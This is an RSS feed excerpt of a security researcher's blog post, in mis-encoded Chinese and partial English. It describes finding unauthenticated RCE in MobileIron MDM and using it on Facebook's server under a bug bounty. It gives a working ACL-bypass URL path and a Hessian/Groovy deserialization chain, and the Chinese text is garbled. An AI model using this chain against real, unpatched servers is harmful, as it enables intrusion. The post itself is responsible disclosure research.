&lt;p&gt;ÁèæÂú®ÊàëÂÄëÂ∑≤Á∂ìÊúâ‰∫Ü‰∏ÄÂÄãÂü∫Êñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDI&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; ÁöÑÂÆåÁæéÈÅ†Á´ØÁ®ãÂºèÁ¢ºÂü∑Ë°åÊºèÊ¥ûÔºåÊé•‰∏ã‰æÜÂ∞±ÈñãÂßãÊîªÊìä Facebook Âêß! ÂæûÂâçÊñáÊèêÂà∞ÔºåÊàëÂÄëÂú® 2016 Âπ¥ÊôÇÂ∞±Â∑≤Áü• Facebook ‰ΩøÁî® MobileIron Áï∂‰Ωú‰ªñÂÄëÁöÑ MDM Ëß£Ê±∫ÊñπÊ°àÔºåÈõñÁÑ∂ÁèæÂú®ÂÜçÊ™¢Êü•‰∏ÄÊ¨°ÁôºÁèæÈ¶ñÈ†ÅÁõ¥Êé•ËÆäÊàê 403 Forbidden ‰∫ÜÔºå‰∏çÈÅéÂπ∏ÈÅãÁöÑÊòØ Web Service Â±§‰∏¶ÁÑ°ÈòªÊìã!
s
&lt;img src=&quot;/assets/img/blog/20200912/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ëê¨‰∫ã‰ø±ÂÇôÔºåÂè™Ê¨†Êù±È¢®! Ê≠£Áï∂Ë¶ÅÊîªÊìä Facebook ÁöÑÂâçÂπæÂ§©ÔºåÊàëÂÄëÁ™ÅÁÑ∂ÊÉ≥Âà∞ÔºåÂæû‰∏äÊ¨°&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;ÈÄ≤ÂÖ• Facebook ‰º∫ÊúçÂô®&lt;/a&gt;ÁöÑÁ∂ìÈ©óÔºåÁî±ÊñºÂÆâÂÖ®‰∏äÁöÑËÄÉÈáèÔºåFacebook ‰ºº‰πéÊúÉÁ¶ÅÊ≠¢ÊâÄÊúâÂ∞çÂ§ñÈÉ®ÈùûÊ≥ïÁöÑÈÄ£Á∑öÔºåÈÄôÈªûÂ∞çÊàëÂÄë JNDI Ê≥®ÂÖ•ÊîªÊìäÊúâËëóËá≥ÈóúÈáçË¶ÅÁöÑÂΩ±Èüø! È¶ñÂÖàÔºåJNDI Ê≥®ÂÖ•ÁöÑÊ†∏ÂøÉÂ∞±ÊòØÈÄèÈÅéÂèóÂÆ≥ËÄÖÈÄ£Á∑öËá≥ÊîªÊìäËÄÖÊéßÂà∂ÁöÑÊÉ°ÊÑè‰º∫ÊúçÂô®Ôºå‰∏¶Êé•Êî∂ÂõûÂÇ≥ÁöÑÊÉ°ÊÑè Naming Reference ÂæåÊâÄÂ∞éËá¥ÁöÑ‰∏ÄÁ≥ªÂàóÂà©Áî®Ôºå‰ΩÜÁèæÂú®ÈÄ£ÊúÄÈñãÂßãÁöÑÈÄ£Á∑öÂà∞ÊîªÊìäËÄÖÁöÑÊÉ°ÊÑè‰º∫ÊúçÂô®ÈÉΩÁÑ°Ê≥ïÔºåÊõ¥Âà•Ë´áÂæåÁ∫åÁöÑÂà©Áî®„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ëá™Ê≠§ÔºåÊàëÂÄëÈóúÊñº JNDI Ê≥®ÂÖ•ÁöÑË∑ØÂ∑≤ÂÖ®Ë¢´Â∞ÅÊÆ∫ÔºåÂè™ËÉΩÂõûÂà∞ Hessian ÂèçÂ∫èÂàóÂåñÈáçÊñ∞ÊÄùËÄÉ! ËÄåÁèæÊúâÁöÑÂà©Áî®ÈèàÁöÜÁÑ°Ê≥ïÈÅîÂà∞ÈÅ†Á´ØÁ®ãÂºèÁ¢ºÂü∑Ë°åÔºåÊâÄ‰ª•ÊàëÂÄëÂã¢ÂøÖÂæóÊããÊ£Ñ JNDI Ê≥®ÂÖ•ÔºåÂ∞ãÊâæ‰∏ÄÂÄãÊñ∞ÁöÑÂà©Áî®Èèà!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÁÇ∫‰∫ÜÂ∞ãÊâæÊñ∞ÁöÑÂà©Áî®ÈèàÔºåÂøÖÈ†àÂÖàÊ∑±ÂÖ•ÁêÜËß£Â∑≤Â≠òÂú®Âà©Áî®ÈèàÁöÑÂéüÁêÜÂèäÊàêÂõ†ÔºåÂú®ÈáçËÆÄ &lt;a href=&quot;https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt; ÁöÑË´ñÊñáÂæåÔºåÊàëÂ∞çÂÖ∂‰∏≠‰∏ÄÂè•Ë©±ÊÑüÂà∞‰∫ÜÂ•ΩÂ•á:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cannot restore Groovy‚Äôs MethodClosure as readResolve() is called which throws an exception.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Âì¶ÔºåÁÇ∫‰ªÄÈ∫º‰ΩúËÄÖË¶ÅÁâπÂú∞Ë£ú‰∏äÈÄôÂè•Ë©±Âë¢? ÊàëÈñãÂßãÊúâÂÄãÁåúÊÉ≥:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;‰ΩúËÄÖË©ï‰º∞ÈÅéÊää Groovy Áï∂ÊàêÂà©Áî®ÈèàÁöÑÂèØË°åÊÄßÔºåÈõñÁÑ∂Ë¢´ÈôêÂà∂‰Ωè‰∫ÜÔºå‰ΩÜ‰∏ÄÂÆöË¶∫ÂæóÊúâÊ©üÊúÉÊâçÊúÉÂØ´ÈÄ≤Ë´ñÊñá‰∏≠!&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÂæûÈÄôÂÄãÁåúÊÉ≥Âá∫ÁôºÔºåÈõñÁÑ∂ Groovy ÁöÑÂà©Áî®ÈèàË¢´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readResolve()&lt;/code&gt; ÈôêÂà∂‰Ωè‰∫ÜÔºå‰ΩÜÂâõÂ•ΩÊàëÂÄëÁõÆÊ®ôÁâàÊú¨ÁöÑ Groovy ÂæàËàäÔºåË™™‰∏çÂÆöÂ∞öÊú™ÊääÈÄôÂÄãÈôêÂà∂Âä†ÂÖ•Á®ãÂºèÂ∫´!&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÊØîËºÉ‰∫Ü‰∏Ä‰∏ã Groovy-1.5.6 ËàáÊúÄÊñ∞ÁâàÊú¨‰ΩçÊñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;groovy/runtime/MethodClosure.java&lt;/code&gt; ‰∏≠ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readSolve()&lt;/code&gt; ÂØ¶Áèæ:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diff&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1_5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3_0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readResolve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ALLOW_RESOLVE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UnsupportedOperationException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂèØ‰ª•ÁúãÂà∞ÁöÑÁ¢∫Âú®ËàäÁâàÊòØÊ≤íÊúâ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ALLOW_RESOLVE&lt;/code&gt; ÈôêÂà∂ÁöÑÔºåËÄåÂæå‰æÜÁ∂ìÈÅéËÄÉÂè§Âæå‰πüÁôºÁèæÔºåÈÄôÂÄãÈôêÂà∂ÂÖ∂ÂØ¶ Groovy Ëá™Â∑±ÁÇ∫‰∫ÜÂõ†Êáâ 2015 Âπ¥ÊâÄÂá∫Áèæ Java ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÊ∏õÁ∑©Êé™ÊñΩÔºåÂõ†Ê≠§‰πüË¢´ÂàÜÈÖç‰∫Ü &lt;a href=&quot;https://groovy-lang.org/security.html&quot;&gt;CVE-2015-3253&lt;/a&gt; ÈÄôÂÄãÊºèÊ¥ûÁ∑®Ëôü! Áî±Êñº Groovy Âè™ÊòØ‰∏ÄÂÄãÂè™Âú®ÂÖßÈÉ®‰ΩøÁî®„ÄÅ‰∏çÊúÉÂ∞çÂ§ñÁöÑÂ∞èÈÖçËßíÔºåÂõ†Ê≠§Âú®Ê≤íÊúâÁâπÂà•ÈúÄÊ±Ç‰∏ãÈñãÁôºËÄÖ‰πü‰∏çÊúÉÁâπÂú∞ÂéªÊõ¥Êñ∞ÂÆÉÔºåÂõ†Ê≠§ÊàêÁÇ∫‰∫ÜÊàëÂÄëÊîªÊìäÈèàÁöÑ‰∏ÄÁí∞! ÈÄô‰πüÂÜç‰∏ÄÊ¨°È©óË≠â‰∫Ü„Äå‰ªª‰ΩïÁúã‰ººËàâÁÑ°ËºïÈáçÁöÑÂ∞èÂÖÉ‰ª∂ÔºåÈÉΩÊúâÂèØËÉΩÊàêÁÇ∫‰Ω†Ë¢´ÊîªÊìäÁöÑ‰∏ªÂõ†„Äç!&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåÔºåÁï∂ÁÑ∂! ÊàëÂÄëÊàêÂäüÁöÑÂèñÂæóÂú® Facebook ‰º∫ÊúçÂô®‰∏äÁöÑ ShellÔºå‰ª•‰∏ãÊòØÂΩ±Áâá:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/hGTLIIOb14A&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;ÊºèÊ¥ûÈÄöÂ†±Ëàá‰øÆÂæ©&quot;&gt;ÊºèÊ¥ûÈÄöÂ†±Ëàá‰øÆÂæ©&lt;/h2&gt;

&lt;p&gt;ÊàëÂÄëÁ¥ÑÂú®‰∏âÊúàÊôÇÂÆåÊàêÊï¥ÂÄãÊºèÊ¥ûÁ†îÁ©∂Ôºå‰∏¶Âú® 4/3 Êó•Â∞áÁ†îÁ©∂ÊàêÊûúÂØ´ÊàêÂ†±ÂëäÔºåÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security@mobileiron.com&lt;/code&gt; ÂõûÂ†±Áµ¶ MobileIron! ÂÆòÊñπÊî∂Âà∞ÂæåËëóÊâãÈñãÂßã‰øÆÂæ©ÔºåÂú® 6/15 ÈáãÂá∫‰øÆË£úÁ®ãÂºè‰∏¶Ë®òÈåÑ‰∫Ü‰∏âÂÄã CVE Á∑®ËôüÔºåË©≥Á¥∞ÁöÑ‰øÆÂæ©ÊñπÂºèË´ãÂèÉÈñ± &lt;a href=&quot;https://www.mobileiron.com/en/blog/mobileiron-security-updates-available&quot;&gt;MobileIron ÂÆòÊñπÁ∂≤Á´ô&lt;/a&gt;!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2020-15505 - Remote Code Execution&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 - Authentication Bypass&lt;/li&gt;
  &lt;li&gt;CVE-2020-15507 - Arbitrary File Reading&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Áï∂ÂÆòÊñπÈáãÂá∫‰øÆË£úÁ®ãÂºèÂæåÔºåÊàëÂÄë‰πüÈñãÂßãÁõ£Êéß‰∏ñÁïå‰∏äÊâÄÊúâÊúâ‰ΩøÁî® MobileIron ‰ºÅÊ•≠ÁöÑ‰øÆÂæ©ÁãÄÊ≥ÅÔºåÈÄôË£°Âè™ÂñÆÁ¥îÊ™¢Êü•ÈùúÊÖãÊ™îÊ°àÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Last-Modified&lt;/code&gt; HeaderÔºåÁµêÊûúÂÉÖ‰æõÂèÉËÄÉ‰∏çÂÆåÂÖ®‰ª£Ë°®ÂØ¶ÈöõÊÉÖÊ≥Å(Unknown ‰ª£Ë°®Êú™Èñã 443/8443 ÁÑ°Ê≥ïÂà©Áî®):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ËàáÊ≠§ÂêåÊôÇÔºåÊàëÂÄë‰πüÊåÅÁ∫åÁõ£ÊéßËëó FacebookÔºå‰∏¶Âú® 15 Â§©Á¢∫Ë™çÈÉΩÊú™‰øÆË£úÂæåÊñº 7/2 Êó•ÊàêÂäüÈÄ≤ÂÖ• Facebook ‰º∫ÊúçÂô®ÂæåÂõûÂ†± Facebook Bug Bounty Program!&lt;/p&gt;

&lt;h2 id=&quot;ÁµêË™û&quot;&gt;ÁµêË™û&lt;/h2&gt;

&lt;p&gt;Âà∞Ê≠§ÔºåÊàëÂÄëÂ∑≤Á∂ìÊàêÂäüÁ§∫ÁØÑ‰∫ÜÂ¶Ç‰ΩïÂ∞ãÊâæ‰∏ÄÂÄã MDM ‰º∫ÊúçÂô®ÁöÑÊºèÊ¥û! ÂæûÁπûÈÅé Java Ë™ûË®ÄÂ±§Á¥öÁöÑ‰øùË≠∑„ÄÅÁ∂≤Ë∑ØÈôêÂà∂ÔºåÂà∞ÂØ´Âá∫ÊîªÊìäÁ®ãÂºè‰∏¶ÊàêÂäüÁöÑÂà©Áî®Âú® Bug Bounty Program ‰∏ä! Âõ†ÁÇ∫ÊñáÈï∑ÔºåÈÇÑÊúâË®±Â§ö‰æÜ‰∏çÂèäÂàÜ‰∫´ÁöÑÊïÖ‰∫ãÔºåÈÄôË£°ÂÉÖÊ¢ùÂàó‰∏Ä‰∏ã‰æõÊúâËààË∂£ÁπºÁ∫åÁ†îÁ©∂ÁöÑ‰∫∫ÂèÉËÄÉ!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Â¶Ç‰ΩïÂæû MDM ‰º∫ÊúçÂô®ÔºåÊéßÂà∂ÂõûÂì°Â∑•ÁöÑÊâãÊ©üË£ùÁΩÆ&lt;/li&gt;
  &lt;li&gt;Â¶Ç‰ΩïÂàÜÊûê MobileIron ÁöÑÁßÅÊúâ MI Protocol&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 Êú¨Ë≥™‰∏äÂÖ∂ÂØ¶ÊòØ‰∏ÄÂÄãÂæàÊúâË∂£ÁöÑË™çË≠âÁπûÈÅéÊºèÊ¥û&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Â∏åÊúõÈÄôÁØáÊñáÁ´†ËÉΩÂ§†ÂñöËµ∑Â§ßÁúæÂ∞çÊñº MDM ÊîªÊìäÈù¢ÁöÑÊ≥®ÊÑèÔºå‰ª•Âèä‰ºÅÊ•≠ÂÆâÂÖ®ÁöÑÈáçË¶ÅÊÄß! ÊÑüË¨ùÊî∂Áúã :D&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM/</link>
                <guid>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM</guid>
                <pubDate>Sat, 12 Sep 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>How I Hacked Facebook Again! Unauthenticated RCE on MobileIron MDM</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hi, it‚Äôs a long time since my last article. This new post is about my research this March, which talks about how I found vulnerabilities on a leading Mobile Device Management product and bypassed several limitations to achieve unauthenticated RCE. All the vulnerabilities have been reported to the vendor and got fixed in June. After that, we kept monitoring large corporations to track the overall fixing progress and then found that Facebook didn‚Äôt keep up with the patch for more than 2 weeks, so we dropped a shell on Facebook and reported to their Bug Bounty program!&lt;/p&gt;

&lt;p&gt;This research is also presented at &lt;a href=&quot;http://hitcon.org/2020&quot;&gt;HITCON 2020&lt;/a&gt;. You can check the slides &lt;a href=&quot;https://hitcon.org/2020/slides/How%20I%20Hacked%20Facebook%20Again!.pdf&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;As a Red Teamer, we are always looking for new paths to infiltrate the corporate network from outside. Just like &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;our research in Black Hat USA last year&lt;/a&gt;, we demonstrated how leading SSL VPNs could be hacked and become your Virtual ‚ÄúPublic‚Äù Network! SSL VPN is trusted to be secure and considered the only way to your private network. But, what if your trusted appliances are insecure?&lt;/p&gt;

&lt;p&gt;Based on this scenario, we would like to explore new attack surfaces on enterprise security, and we get interested in MDM, so this is the article for that!&lt;/p&gt;

&lt;h2 id=&quot;what-is-mdm&quot;&gt;What is MDM?&lt;/h2&gt;

&lt;p&gt;Mobile Device Management, also known as MDM, is an asset assessment system that makes the employees‚Äô &lt;a href=&quot;https://en.wikipedia.org/wiki/Bring_your_own_device&quot;&gt;BYOD&lt;/a&gt; more manageable for enterprises. It was proposed in 2012 in response to the increasing number of tablets and mobile devices. MDM can guarantee that the devices are running under the corporate policy and in a trusted environment. Enterprise could manage assets, install certificates, deploy applications and even lock/wipe devices remotely to prevent data leakage as well.&lt;/p&gt;

&lt;p&gt;UEM (Unified Endpoint Management) is a newer term relevant to MDM which has a broader definition for managed devices. Following we use MDM to represent similar products!&lt;/p&gt;

&lt;h2 id=&quot;our-target&quot;&gt;Our target&lt;/h2&gt;

&lt;p&gt;MDM, as a centralized system, can manage and control all employees‚Äô devices. It is undoubtedly an ideal asset assessment system for a growing company. Besides, MDM must be reachable publicly to synchronize devices all over the world. A centralized and public-exposing appliance, what could be more appealing to hackers?&lt;/p&gt;

&lt;p&gt;Therefore, we have seen hackers and APT groups abusing MDM these years! Such as phishing victims to make MDM a C&amp;amp;C server of their mobile devices, or even compromising the corporate exposed MDM server to push malicious Trojans to all devices. You can read the report &lt;a href=&quot;https://blogs.cisco.com/security/talos/malicious-mdm-lets-hide-this-app&quot;&gt;Malicious MDM: Let‚Äôs Hide This App&lt;/a&gt; by Cisco Talos team and &lt;a href=&quot;https://research.checkpoint.com/2020/mobile-as-attack-vector-using-mdm/&quot;&gt;First seen in the wild - Malware uses Corporate MDM as attack vector&lt;/a&gt; by CheckPoint CPR team for more details!&lt;/p&gt;

&lt;p&gt;From previous cases, we know that MDM is a solid target for hackers, and we would like to do research on it. There are several MDM solutions, even famous companies such as Microsoft, IBM and Apple have their own MDM solution. Which one should we start with?&lt;/p&gt;

&lt;p&gt;We have listed known MDM solutions and scanned corresponding patterns all over the Internet. We found that the most prevalent MDMs are VMware AirWatch and MobileIron!&lt;/p&gt;

&lt;p&gt;So, why did we choose MobileIron as our target? According to their official website, more than 20,000 enterprises chose MobileIron as their MDM solution, and most of our customers are using that as well. We also know Facebook has exposed the MobileIron server &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;since 2016&lt;/a&gt;. We have analyzed Fortune Global 500 as well, and found more than 15% using and exposing their MobileIron server to the public! Due to above reasons, it became our main target!&lt;/p&gt;

&lt;h2 id=&quot;where-to-start&quot;&gt;Where to Start&lt;/h2&gt;

&lt;p&gt;From &lt;a href=&quot;https://www.cvedetails.com/vulnerability-list/vendor_id-13968/Mobileiron.html&quot;&gt;past vulnerabilities&lt;/a&gt;, we learned there aren‚Äôt too many researchers diving into MobileIron. Perhaps the attack vector is still unknown. But we suspect the main reason is that the firmware is too hard to obtain. When researching an appliance, turning a pure BlackBox testing into GrayBox, or WhiteBox testing is vital. We spent lots of time searching for all kinds of information on the Internet, and ended up with an RPM package. This RPM file is supposed to be the developer‚Äôs testing package. The file is just sitting on a listable WebRoot and indexed by Google Search.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Anyway, we got a file to research. The released date of the file is in early 2018. It seems a little bit old but still better than nothing!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. We have informed MobileIron and the sensitive files has been removed now.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;finding-vulnerabilities&quot;&gt;Finding Vulnerabilities&lt;/h2&gt;

&lt;p&gt;After a painful time solving the dependency hell, we set the testing package up finally. The component is based on Java and exposed three ports:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;443 - the user enrollment interface&lt;/li&gt;
  &lt;li&gt;8443 - the appliance management interface&lt;/li&gt;
  &lt;li&gt;9997 - the MobileIron device synchronization protocol (MI Protocol)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All opened ports are TLS-encrypted. Apache is in the front of the web part and proxies all connections to backend, a Tomcat with Spring MVC inside.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/2_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Due to the Spring MVC, it‚Äôs hard to find traditional vulnerabilities like SQL Injection or XSS from a single view. Therefore, examining the logic and architecture is our goal this time!&lt;/p&gt;

&lt;p&gt;Talking about the vulnerability, the root cause is straightforward. Tomcat exposed a Web Service that deserializes user input with Hessian format. However, this doesn‚Äôt mean we can do everything! The main effort of this article is to solve that, so please see the exploitation below.&lt;/p&gt;

&lt;p&gt;Although we know the Web Service deserializes the user input, we can not trigger it. The endpoint is located on both:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;User enrollment interface - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron/mifs/services/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Management interface - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron:8443/mics/services/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We can only touch the deserialization through the management interface because the user interface blocks the Web Service access. It‚Äôs a critical hit for us because most enterprises won‚Äôt expose their management interface to the Internet, and a management-only vulnerability is not useful to us so that we have to try harder. :(&lt;/p&gt;

&lt;p&gt;Scrutinizing the architecture, we found Apache blocks our access through Rewrite Rules. It looks good, right?&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services/(.*)$ https://%{SERVER_NAME}:8443/mifs/services/$1 [R=307,L]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services [F]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;MobileIron relied on Apache Rewrite Rules to block all the access to Web Service. It‚Äôs in the front of a reverse-proxy architecture, and the backend is a Java-based web server.&lt;/p&gt;

&lt;p&gt;Have you recalled something?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Yes, the &lt;a href=&quot;https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&quot;&gt;Breaking Parser Logic&lt;/a&gt;! It‚Äôs the reverse proxy attack surface I &lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges#blackbox&quot;&gt;proposed in 2015&lt;/a&gt;, and presented at &lt;a href=&quot;https://www.blackhat.com/us-18/briefings.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-0days-out&quot;&gt;Black Hat USA 2018&lt;/a&gt;. This technique leverage the inconsistency between the Apache and Tomcat to bypass the ACL control and reaccess the Web Service. BTW, this excellent technique is also applied to the recently &lt;a href=&quot;https://support.f5.com/csp/article/K52145254&quot;&gt;F5 BIG-IP TMUI RCE vulnerability&lt;/a&gt;!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://mobileiron/mifs/.;/services/someService
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;exploiting-vulnerabilities&quot;&gt;Exploiting Vulnerabilities&lt;/h2&gt;

&lt;p&gt;OK, now we have access to the deserialization wherever it‚Äôs on enrollment interface or management interface. Let‚Äôs go back to exploitations!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/mbechler&quot;&gt;Moritz Bechler&lt;/a&gt; has an awesome research which summarized the Hessian deserialization vulnerability on his whitepaper, &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt;. From the &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; source code, we learn the Hessian deserialization triggers the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;equals()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode()&lt;/code&gt; while reconstructing a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HashMap&lt;/code&gt;. It could also trigger the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toString()&lt;/code&gt; through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XString&lt;/code&gt;, and the known exploit gadgets so far are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apache XBean&lt;/li&gt;
  &lt;li&gt;Caucho Resin&lt;/li&gt;
  &lt;li&gt;Spring AOP&lt;/li&gt;
  &lt;li&gt;ROME EqualsBean/ToStringBean&lt;/li&gt;
